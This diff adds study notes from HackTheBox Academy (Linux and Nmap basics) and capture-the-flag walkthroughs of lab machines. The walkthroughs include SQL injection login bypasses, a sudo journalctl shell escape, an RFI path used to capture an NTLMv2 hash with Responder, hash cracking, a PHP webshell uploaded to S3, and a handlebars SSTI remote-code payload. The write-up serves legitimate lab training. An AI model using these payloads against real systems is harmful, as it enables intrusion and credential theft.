@@ -1,0 +1,863 @@
+---
+title: HackTheBox
+author: Mateus Marques
+output:
+ html_document:
+  highlight: tango
+urlcolor: magenta
+---
+
+```{r load_packages, message=FALSE, warning=FALSE, include=FALSE}
+library(fontawesome)
+```
+
+# 1. HackTheBox Academy
+
+## Linux Fundamentals
+
+Command `uname -a` to discover which Linux distribution you are in.
+
+
+
+The `PS1` variable can be modified to display useful information, such as full hostname (IP addresses in some cases) and date.
+
+
+
+To find help about Linux, have in mind `man` and `apropos`.
+
+
+
+Commands that display system information:
+```
+whoami, id, hostname, hostnamectl, uname, pwd, ifconfig, ip, netstat,
+ss, ps, who, env, lsblk, lsusb, lsof, lspci.
+```
+
+The command `uname -r` can be useful, because we can search for a kernel specific version exploit. Example: search for "4.15.0-99-generic exploit", and the first [result](https://www.exploit-db.com/exploits/47163) immediately appears useful to us.
+
+
+
+Connect to VPN (`sudo` is necessary):
+```{bash eval=F}
+sudo openvpn academy-regular.ovpn
+```
+
+To connect via SSH:
+```{bash eval=F}
+ssh <user>@<IP address>
+```
+
+The command `stat` displays metadata about files, for example its inode (index number), birth, last modification, etc.
+
+
+
+The `tree` command is much more useful than listing one directory by one with `ls`.
+
+
+
+Commands for file searching: `which, find, locate`.
+
+
+
+What is the name of the config file that has been created after `2020-03-03` and is smaller than `28k` but larger than `25k`?
+```{bash eval=F}
+find / -type f -name *.conf -size +25k -size -28k -exec ls -la {} \; 2>/dev/null
+```
+
+If we try to use the argument `-newerBt 2020-03-03` we get
+"\texttt{find: This system does not provide a way to find the birth time of a file.}"
+
+
+
+How many files exist on the system that have the `.bak` extension?
+```{bash eval=F}
+find / -type f -name *.bak 2>/dev/null | wc -l
+```
+
+
+
+File descriptors are `STDIN - 0`, `STDOUT - 1`, `STDERR - 2`. We can redirect erros and output with `>`. The `<` character serves as standard input. To append text to a file, we use `>>`. The `<< FINISH` serves to enter standard input through a stream until we type `"FINISH"` to define the input's end. Usually we use `EOF` instead of `FINISH`, but it can be any word. The pipe `|` is for redirecting standard output to standard input for the next command.
+```{bash eval=F}
+find /etc -name shadow 2>/dev/null > results.txt
+find /etc -name shadow 2>stderr.txt 1>stdout.txt
+cat < input.txt
+cat << EOF > stream.txt
+```
+```{bash eval=F}
+find /etc -name *.conf 2>/dev/null | grep systemd | wc -l
+```
+
+
+
+Pagers are `more` and `less`. Command `head` for the first lines of input, `tail` for the last lines, and `sort` to sort the lines.
+
+
+
+To filter lines we use `grep`. The option `-v` is to exclude the filtered results.
+```{bash eval=F}
+cat /etc/passwd | grep -v "false\|nologin"
+```
+
+The `cut` command is to remove specific delimiters and show the words in a specified position. The option `-d` is for the delimiter and `-f` for the position.
+```{bash eval=F}
+cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
+```
+
+In the next example, we replace the colon character with space using `tr`.
+```{bash eval=F}
+cat /etc/passwd | grep -v "false\|nologin" | tr ":" " "
+```
+
+The tool `column` is to display in a tabular form.
+```{bash eval=F}
+cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t
+```
+
+Of course, `sed` and `awk` need no introduction.
+```{bash eval=F}
+cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " |
+awk '{print $1, $NF}' | sed 's/bin/HTB/g'
+```
+
+Counting lines with `wc -l`.
+
+
+
+How many services are listening on the target system on all interfaces? (Not on localhost and IPv4 only)
+
+The file `/etc/services` is a table for the internet services, port numbers and protocol types. "Every networking program should look into this file to get the port number (and protocol) for its service". But this file does not tell us about the active running services.
+```{bash eval=F}
+ss -Hl -4 | grep "LISTEN" | grep -v "127\.0\.0" | wc -l
+```
+
+The command `ss` dumps socket (network services) statistics.
+
+
+
+Determine what user the ProFTPd server is running under. Submit the username as the answer.
+```{bash eval=F}
+ps aux | grep -i "proftpd"
+```
+
+
+
+Use cURL from your Pwnbox (not the target machine) to obtain the source code of the [https://www.inlanefreight.com](https://www.inlanefreight.com) website and filter all unique paths of that domain. Submit the number of these paths as the answer.
+```{bash eval=F}
+curl -L "https://www.inlanefreight.com" > site.html
+grep -o "https\?://www\.inlanefreight\.com[^\"']*" site.html |
+sort | uniq | wc -l
+```
+
+```{bash eval=F}
+curl -L "https://www.inlanefreight.com" > site.html
+grep -o "https\?://www\.inlanefreight\.com[^\"']*" site.html |
+sort | uniq | wc -l
+```
+
+Change permissions "\texttt{rwx}" with `chmod` and ownership with `chown`.
+
+
+
+Besides assigning direct user and group permissions, we can also configure special permissions for files by setting the Set User ID (SUID) and Set Group ID (SGID) bits. These SUID/SGID bits allow, for example, users to run programs with the rights of another user. Administrators often use this to give their users special rights for certain applications or files. The letter "s" is used instead of an "x". When executing such a program, the SUID/SGID of the file owner is used.
+
+
+If the administrator sets the SUID bit to `journalctl`, any user with access to this application could execute a shell as root. This is because it invokes the pager `less`, that can execute arbitrary code.
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+```{bash eval=F}
+journalctl
+!/bin/sh
+```
+
+If the `journalctl` is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+```{bash eval=F}
+sudo journalctl
+!/bin/sh
+```
+
+"Sticky bits" add another level of security for files and directories. Read about it later.
+
+
+
+\pagebreak
+
+## Nmap
+
+Option `-A` enables OS and version detection, script scanning and traceroute (it stands for aggressive).
+
+
+
+Option `-T4` is for faster execution.
+
+
+
+You can specify them with the `-T` option and their number (0–5) or their name. The template names are paranoid (0),
+sneaky (1), polite (2), normal (3), aggressive (4), and insane (5). The first two are for IDS evasion. Polite mode slows down the scan to use less bandwidth and target machine resources. Normal mode is the default and
+so `-T3` does nothing. Aggressive mode speeds scans up by making the assumption that you are on a reasonably fast and reliable network. Finally insane mode assumes that you are on an extraordinarily fast network or are
+willing to sacrifice some accuracy for speed.
+
+
+
+Option `-p` is to specify port ranges, and `-p-` to scan for all ports.
+
+
+
+Option `-sV` is to determine service/version info on open ports.
+
+
+
+Option `-O` enables OS detection.
+
+
+
+The `-P` options to nmap specify which "ping" methods it should use to see if a host is up. Option `-Pn` treats all hosts as online -- does not ping, and skip host discovery.
+
+
+
+Look at `-sS`. It says it performs a stealthy scan.
+
+Example:
+```{bash eval=F}
+nmap -A -T4 -sV "10.129.15.46"
+```
+
+Very fast scan:
+```{bash eval=F}
+nmap -T5 -A -p- --min-rate=500 10.129.44.239
+```
+
+\pagebreak
+
+## 2. HackTheBox Machines
+
+### Meow `r fa("linux")`
+
+What tool do we use to test our connection to the target with an ICMP echo request?
+```{bash eval=F}
+ping "10.129.74.130"
+```
+
+What service do we identify on port 23/tcp during our scans?
+```{bash eval=F}
+nmap -p 23 "10.129.74.130"
+```
+
+What username is able to log into the target over telnet with a blank password?
+```{bash eval=F}
+telnet -l root "10.129.74.130" 23
+cat flag.txt
+```
+
+### Fawn `r fa("linux")`
+
+What does the 3-letter acronym FTP stand for? File Transfer Protocol.
+
+Which port does the FTP service listen on usually? Port 21.
+
+What acronym is used for the secure version of FTP? `sftp`.
+
+From your scans, what version is FTP running on the target? `vsftpd 3.0.3`.
+
+From your scans, what OS type is running on the target? Unix.
+
+What is username that is used over FTP when you want to log in without having an account? From the scan:
+```{bash eval=F}
+nmap -sV -A -T4 10.129.15.46
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+```
+
+The output `ftp-anon` is a [script](https://nmap.org/nsedoc/scripts/ftp-anon.html) from `nmap`. It checks if the FTP running service allows for anonymous login.
+
+From GitHub [Default-Credentials](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt), we see `anonymous:anonymous`.
+
+What is the response code we get for the FTP message "Login successful"? 230.
+```{bash eval=F}
+ftp "10.129.15.46"
+Name (10.129.15.46:sekai): anonymous
+331 Please specify the password.
+Password: anonymous
+230 Login successful.
+```
+
+What is the command used to download the file we found on the FTP server? `get`.
+```{bash eval=F}
+ftp> ls
+ftp> get flag.txt
+```
+
+### Dancing `r fa("windows")`
+
+What does the 3-letter acronym SMB stand for? Server Message Block.
+
+What port does SMB use to operate at? Port 445 (or 139, NetBIOS).
+```{bash eval=F}
+nmap -sV -A -T4 10.129.71.114
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Host script results:
+| smb2-time:
+|   date: 2024-03-21T18:12:02
+|_  start_date: N/A
+|_clock-skew: 3h59m59s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+```
+
+What is the service name for port 445 that came up in our scan? `microsoft-ds`.
+
+What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?
+```{bash eval=F}
+sudo pacman -S smbclient
+smbclient -L 10.129.71.114
+Password: (empty)
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN\$         Disk      Remote Admin
+        C\$             Disk      Default share
+        IPC\$           IPC       Remote IPC
+        WorkShares      Disk
+```
+
+What is the name of the share we are able to access in the end with a blank password? WorkShares.
+
+```{bash eval=F}
+smbclient -N //10.129.71.114/Workshares
+smb: \> ls
+smb: \> cd James.P
+smb: \> get flag.txt
+```
+
+### Redeemer `r fa("linux")`
+
+Which TCP port is open on the machine? HTB hints that the TCP open port has 4 digits and the last one is 9. Generate a list `ports9.txt` with these ports and
+```{bash eval=F}
+for port in $(cat ports9.txt) ; do
+  nmap -p $port 10.129.70.15 >> scan.txt
+done
+grep -i "open" scan.txt
+```
+
+Which service is running on the port that is open on the machine? `redis` is open on port 6379.
+
+What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database.
+Googling about Redis, we see that it is an "in-memory Database".
+
+Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
+```{bash eval=F}
+sudo pacman -S redis
+redis-cli -h 10.129.70.15
+```
+
+Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? From [https://redis.io/commands/](https://redis.io/commands/), `info`.
+```{bash eval=F}
+10.129.70.15:6379> info
+10.129.70.15:6379> select 0
+10.129.70.15:6379> info
+# Keyspace
+db0:keys=4,expires=0,avg_ttl=0
+10.129.70.15:6379> keys *
+10.129.70.15:6379> get flag
+```
+
+
+What is the version of the Redis server being used on the target machine? `5.0.7`.
+
+Which command is used to select the desired database in Redis? `select 0`.
+
+How many keys are present inside the database with index 0? 4.
+
+### Explosion `r fa("windows")`
+What does the 3-letter acronym RDP stand for? Remote Desktop Protocol.
+
+What is a 3-letter acronym that refers to interaction with the host through a command line interface? cli.
+
+What about graphical user interface interactions? gui.
+
+What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23? telnet.
+
+What is the name of the service running on port 3389 TCP? ms-wbt-server.
+
+What is the switch used to specify the target host's IP when using xfreerdp? `/v:`.
+
+What username successfully returns a desktop projection to us with a blank password? Administrator.
+```{bash eval=F}
+sudo pacman -S freerdp
+xfreerdp /v:10.129.150.101:3389 /u:Administrator
+```
+
+### Preignition `r fa("linux")`
+
+Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Which is another name for this? (i) Local File Inclusion, (ii) dir busting, (iii) hash cracking. (ii) dir busting.
+
+What switch do we use for nmap's scan to specify that we want to perform version detection? `-sV`.
+
+What does Nmap report is the service identified as running on port 80/tcp? `http`.
+
+What server name and version of service is running on port 80/tcp? `nginx 1.14.2`.
+```{bash eval=F}
+nmap -sV -p 80 10.129.90.209
+```
+
+What switch do we use to specify to Gobuster we want to perform dir busting specifically? `dir`.
+
+When using gobuster to dir bust, what switch do we add to make sure it finds PHP pages? `-x php`.
+```{bash eval=F}
+gobuster dir -x php -w wordlist.txt -u 10.129.90.209
+```
+
+Kali Linux already comes with wordlists, but we can download on [GitHub](https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt).
+
+What page is found during our dir busting activities? `admin.php`.
+
+What is the HTTP status code reported by Gobuster for the discovered page? `200`.
+
+Go to `http://10.129.90.209/admin.php`. Log in with `admin:admin`.
+
+### Mongod `r fa("linux")`
+
+How many TCP ports are open on the machine? 2 ports. Port 22 for `ssh` and 27017 for `mongodb`.
+
+Scan for every single port, because MongoDB uses ports with high numbers.
+```{bash eval=F}
+nmap -O -sV -p- -Pn 10.129.181.87
+```
+
+Which service is running on port 27017 of the remote host? `MongoDB 3.6.8`.
+
+What type of database is MongoDB? (Choose: SQL or NoSQL) NoSQL.
+
+What is the command name for the Mongo shell that is installed with the mongodb-clients package? `mongo` or `mongosh`.
+
+What is the command used for listing all the databases present on the MongoDB server? `show dbs`. Take a look at [Pentesting MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb).
+
+What is the command used for listing out the collections in a database? `show collections`.
+
+What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read? `db.flag.find().pretty()`.
+```{bash eval=F}
+sudo pacman -S mongodb-bin
+mongosh 10.129.181.87
+> show dbs
+> use sensitive_information
+> show collections
+> db.flag.find().pretty()
+```
+
+### Synced `r fa("linux")`
+
+What is the default port for rsync? 873.
+
+How many TCP ports are open on the remote host? 1.
+```{bash eval=F}
+nmap -sV -Pn -p- -T4 10.129.195.160
+```
+
+What is the protocol version used by rsync on the remote machine? 31.
+
+What is the most common command name on Linux to interact with rsync? `rsync`.
+
+What credentials do you have to pass to rsync in order to use anonymous authentication? `None`.
+
+What is the option to only list shares and files on rsync? Do `rsync -h | grep list`. The option is `--list-only`.
+```{bash eval=F}
+sudo pacman -S tldr     # GREAT TOOL
+tldr rsync
+rsync rsync://10.129.195.160
+public      Anonymous Share
+rsync rsync://10.129.195.160/public
+rsync rsync://10.129.195.160/public/flag.txt ./
+```
+
+### Appointment `r fa("linux")`
+
+What does the acronym SQL stand for? Structured Query Language.
+
+What is one of the most common type of SQL vulnerabilities? SQL Injection.
+
+What is the 2021 OWASP Top 10 classification for this vulnerability? A03:2021-Injection.
+
+What does Nmap report as the service and version that are running on port 80 of the target?
+
+`Apache httpd 2.4.38 ((Debian))`.
+```{bash eval=F}
+sudo nmap -sV -O -Pn -T4 -p 80 10.129.193.161
+```
+
+What is the standard port used for the HTTPS protocol? 443.
+
+What is a folder called in web-application terminology? directory.
+
+What is the HTTP response code is given for `Not Found' errors? 404.
+
+Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? `dir`.
+
+What single character can be used to comment out the rest of a line in MySQL? `#`.
+
+If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? Congratulations.
+
+
+
+Go to `http://10.129.193.161` and we see a login screen. Googling "login as admin sql injection", we [come up with](https://sechow.com/bricks/docs/login-1.html) the idea of putting some arbitrary entry in the user field, and `passwd' or '1'='1` in the password field.
+
+The idea is that, when `user="user"` and `password="passwd"`, the server is executing a SQL query like:
+```{sql eval=F}
+SELECT * FROM users WHERE user='user' and password='passwd'
+```
+If we put `user="user"` and `password="passwd' or '1'='1"`, the query becomes
+```{sql eval=F}
+SELECT * FROM users WHERE user='user' and password='passwd' or '1'='1'
+```
+The `password='passwd' or '1'='1'` condition is always true, so the password verification never happens.
+
+
+Another way to do it is putting `user="' or 1#"` and `password="asd"`. The `#` character will comment out the rest of the line, and the constant `1` is always true.
+
+### Sequel `r fa("linux")`
+
+During our scan, which port do we find serving MySQL? 3306 standard `mysql` port.
+
+What community-developed MySQL version is the target running? MariaDB.
+
+When using the MySQL command line client, what switch do we need to use in order to specify a login username? `-u`.
+
+Which username allows us to log into this MariaDB instance without providing a password? `root`.
+
+In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? `*`.
+
+In SQL, what symbol do we need to end each query with? `;`.
+
+There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? `htb`.
+```{bash eval=F}
+[sekai@arch ~]$ mariadb -u root -h "10.129.44.239"
+```
+```{sql eval=F}
+MariaDB [(none)]> show databases;
+MariaDB [(none)]> use htb;
+MariaDB [htb]> show tables;
+MariaDB [htb]> select * from config;
+```
+
+### Crocodile `r fa("linux")`
+
+What Nmap scanning switch employs the use of default scripts during a scan? `-sC`.
+```{bash eval=F}
+[sekai@arch ~]$ nmap -T5 -sC -A -p- --min-rate=500 "10.129.222.85"
+```
+```{bash eval=F}
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.15.23
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Smash - Bootstrap Business Template
+Service Info: OS: Unix
+```
+
+What service version is found to be running on port 21? `vsftpd 3.0.3`.
+
+What FTP code is returned to us for the "Anonymous FTP login allowed" message? `230`.
+
+After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? `anonymous`.
+
+After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? `get`.
+
+What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? `admin`.
+
+What version of Apache HTTP Server is running on the target host? `Apache httpd 2.4.41`.
+
+What switch can we use with Gobuster to specify we are looking for specific filetypes? `-x`.
+```{bash eval=F}
+ftp 10.129.222.85
+ftp> ls
+ftp> get allowed.userlist
+ftp> get allowed.userlist.passwd
+ftp> exit
+gobuster dir -x php -w directory-list-2.3-medium.txt -u 10.129.222.85
+```
+
+Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? `login.php`.
+
+Go to `10.129.222.85/login.php` and put `username=admin` and `password=rKXM59ESxesUFHAd`.
+
+### Responder `r fa("windows")`
+
+When visiting the web service using the IP address, what is the domain that we are being redirected to? `unika.htb`.
+```{bash eval=F}
+[sekai@arch ~]# sudo nmap -T5 -sC -sV -O -p 80 "10.129.97.105"
+```
+```{bash eval=F}
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Which scripting language is being used on the server to generate webpages? `php`.
+```{bash eval=F}
+[sekai@arch ~]# gobuster dir -x html \
+-w Workspace/wordlists/directory-list-2.3-small.txt -u "10.129.97.105"
+```
+```{bash eval=F}
+/english.html         (Status: 200) [Size: 46453]
+/french.html          (Status: 200) [Size: 47199]
+/german.html          (Status: 200) [Size: 46984]
+```
+
+What is the name of the URL parameter which is used to load different language versions of the webpage? `page`.
+
+We can access `http://10.129.97.105/english.html`, `http://10.129.97.105/french.html`, etc.
+
+In order to access `http://10.129.97.105` (it redirects us to `http://unika.htb`, which has no connection), we need to change our `/etc/hosts` file:
+```{bash eval=F}
+/etc/hosts
+# custom hosts
+10.129.97.105   unika.htb
+```
+
+Which of the following values for the `page' parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
+```{bash eval=F}
+../../../../../../../../windows/system32/drivers/etc/hosts
+```
+
+Which of the following values for the `page' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
+```{bash eval=F}
+//10.10.14.208/somefile
+```
+
+In this case `10.10.14.208` is my IP address on the VPN.
+
+What does NTLM stand for? New Technology LAN Manager.
+
+Which flag do we use in the Responder utility to specify the network interface? `-I`.
+```{bash eval=F}
+yay -S responder
+echo "sometext" > somefile
+ip a
+responder -I tun0
+```
+
+There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john', but the full name is what? John the Ripper.
+
+Then we go to `unika.htb/?page=//10.10.14.208/somefile`. The `responder` utility than obtains a NTLMv2 hash. We save it to `hash.txt`, then use `john`:
+```{bash eval=F}
+sudo pacman -S john
+tldr john
+john hash.txt
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+badminton        (Administrator)
+```
+
+What is the password for the administrator user? `badminton`.
+
+We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? `5985`, result of our scan.
+
+We need to install `evil-winrm` to remotely access the Windows service.
+```{bash eval=F}
+yay -S ruby-evil-winrm
+tldr evil-winrm
+evil-winrm --ip 10.129.83.31 --user Administrator --password badminton -P 5985
+```
+
+We get the error
+```{bash eval=F}
+Error: An error of type OpenSSL::Digest::DigestError happened, message is Digest
+initialization failed: initialization error
+```
+
+I found the [solution](https://forum.manjaro.org/t/openssl-issue-with-ruby-3-0-6p216/147369) to this issue by editing the `/etc/ssl/openssl.cnf` file. The following sections need to be modified:
+```{bash eval=F}
+[provider_sect]
+default = default_sect
+legacy = legacy_sect
+
+[default_sect]
+activate = 1
+
+[legacy_sect]
+activate = 1
+```
+
+Now we can hack the machine:
+```{bash eval=F}
+evil-winrm --ip 10.129.97.105 --user Administrator --password badminton -P 5985
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users/mike
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users/mike/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat /Users/mike/Desktop/flag.txt
+*Evil-WinRM* PS C:\Users\Administrator\Documents> exit
+```
+
+### Three `r fa("linux")`
+
+```{bash eval=F}
+nmap -T5 -Pn -sV -p- --min-rate=1000 "10.129.193.208"
+```
+```{bash eval=F}
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+How many TCP ports are open? `2`.
+
+What is the domain of the email address in the ``Contact" section of the website? `thetoppers.htb`.
+
+In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? `/etc/hosts`.
+```{bash eval=F}
+echo "10.129.193.208    thetoppers.htb" | sudo tee -a /etc/hosts
+```
+
+```{bash eval=F}
+gobuster vhost -w subdomains-top1million-5000.txt -u thetoppers.htb --append-domain
+```
+The option `--append-domain` is important. Otherwise, the wordlist file must contain the full domains.
+Which sub-domain is discovered during further enumeration? `s3.thetoppers.htb`.
+
+Which service is running on the discovered sub-domain? amazon s3.
+```{bash eval=F}
+echo "10.129.193.208    s3.thetoppers.htb" | sudo tee -a /etc/hosts
+```
+
+Which command line utility can be used to interact with the service running on the discovered sub-domain? `awscli`.
+
+Which command is used to set up the AWS CLI installation? `aws configure`.
+
+What is the command used by the above utility to list all of the S3 buckets? `aws s3 ls`.
+
+This server is configured to run files written in what web scripting language? `php`.
+```{bash eval=F}
+pacman -Ss amazon
+sudo pacman -S aws-cli
+aws configure
+```
+
+Use fake values for the AWS account, since it does not matter.
+```{bash eval=F}
+AWS Access Key ID [None]: aSsad
+AWS Secret Access Key [None]: adsasd
+Default region name [None]: asdijigj
+Default output format [None]: idjoa
+```
+
+```{bash eval=F}
+aws s3 ls s3://thetoppers.htb
+Could not connect to the endpoint URL: "http://s3.a.amazonaws.com/thetoppers.htb"
+```
+
+Modify the endpoint URL. Upload a simple PHP webshell `shell.php`.
+```{bash eval=F}
+$ aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
+$ echo "<?php system($_GET['cmd']); ?>" > shell.php
+$ aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb
+```
+
+Next we go to the website with URL parameters:
+```{bash eval=F}
+http://thetoppers.htb/shell.php?cmd=ls
+images index.php shell.php
+http://thetoppers.htb/shell.php?cmd=ls ..
+flag.txt html
+http://thetoppers.htb/shell.php?cmd=cat ../flag.txt
+```
+
+### Ignition `r fa("linux")`
+
+```{bash eval=F}
+nmap -T5 -p- -sV -sC --min-rate=1000 "10.129.127.25"
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.14.2
+```
+```{bash eval=F}
+echo "10.129.127.25  ignition.htb" | sudo tee -a /etc/hosts
+```
+
+Which service version is found to be running on port 80? `nginx 1.14.2`.
+
+What is the 3-digit HTTP status code returned when you visit http://{machine IP}/? `302` (redirection code). Can be seen in Burp.
+
+What is the virtual host name the webpage expects to be accessed by? `ignition.htb`.
+
+What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs? `/etc/hosts`.
+
+Use a tool to brute force directories on the webserver. What is the full URL to the Magento login page? `http://ignition.htb/admin`.
+```{bash eval=F}
+gobuster dir -u http://ignition.htb -w common.txt -x php,html
+```
+
+Look up the password requirements for Magento and also try searching for the most common passwords of 2023. Which password provides access to the admin account? `qwerty123`. Literally search Google for top 10 most common passwords and try each one. Not very interesting. We could also use `hydra` for this.
+
+# Bike `r fa("linux")`
+
+ What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high. `22,80`.
+```{bash eval=F}
+nmap -T5 -p- -sV -sC --min-rate=1000 "10.129.76.182"
+echo "10.129.76.182" | sudo tee -a /etc/hosts
+```
+
+What software is running the service listening on the http/web port identified in the first question? `node.js`, from Wappalyzer.
+
+What is the name of the Web Framework according to Wappalyzer? `Express`, from Wappalyzer.
+
+What is the name of the vulnerability we test for by submitting `{{7*7`}}? Server-Side Template Injection. [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).
+
+What is the templating engine being used within Node.JS? `handlebars`, from `node.js`. Can be seen by putting `{{7*7`}} in the email entry.
+
+What is the name of the BurpSuite tab used to encode text? Decoder. I need to study BurpSuite. The idea is to encode the SSTI code from HackTricks into an URL.
+
+In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use? `URL`.
+
+When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error? `require`. It's from a node.js module.
+
+What variable is the name of the top-level scope in Node.JS? `global`.
+
+HackTricks' payload for `handlebars` uses a module called `require`, which is not global in `node.js` and we can not access it. But if we search in the documentation [https://nodejs.org/api/globals.html](https://nodejs.org/api/globals.html), we see that the module `process` is global and have similar functionality as `require`. So, we modify the payload to use the `process` module. Remember it has to be encoded into an URL.
+```{js eval=F}
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+The `whoami` command through the payload returns `root` in BurpSuite.
+Change the command to `cat /root/flag.txt` and we have our flag!
+
+By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user? `root`.
